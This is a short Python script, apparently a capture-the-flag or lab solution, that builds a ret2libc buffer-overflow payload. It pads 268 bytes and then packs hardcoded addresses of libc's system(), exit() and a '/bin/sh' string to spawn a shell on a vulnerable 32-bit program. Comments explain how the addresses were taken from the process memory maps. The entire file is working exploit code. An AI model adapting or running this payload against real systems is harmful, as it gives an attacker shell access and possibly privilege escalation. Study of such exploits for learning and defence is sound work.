from struct import pack

# By accessing the PID maps, it is possible to access the base address where libc is sitting with exec permissions
libc_base = 0xb7e26000
# Repeating the same process for system and exit
system = libc_base + 0x0003e3e0
exit = libc_base + 0x000311b0
# We get the string by finding the /bin/sh string and grabbing the pointer which points to it.
binsh_string = libc_base + 0x15fa69
# system offset = 0003e3e0
# exit offset = 000311b0
# /bin/sh offset = 15fa69

rop = "A" * (268) # Offset bytes
rop += pack("<L", system) # system address
rop += pack("<L", exit) # Exit address
rop += pack("<L", binsh_string) # /bin/sh address
print(rop)
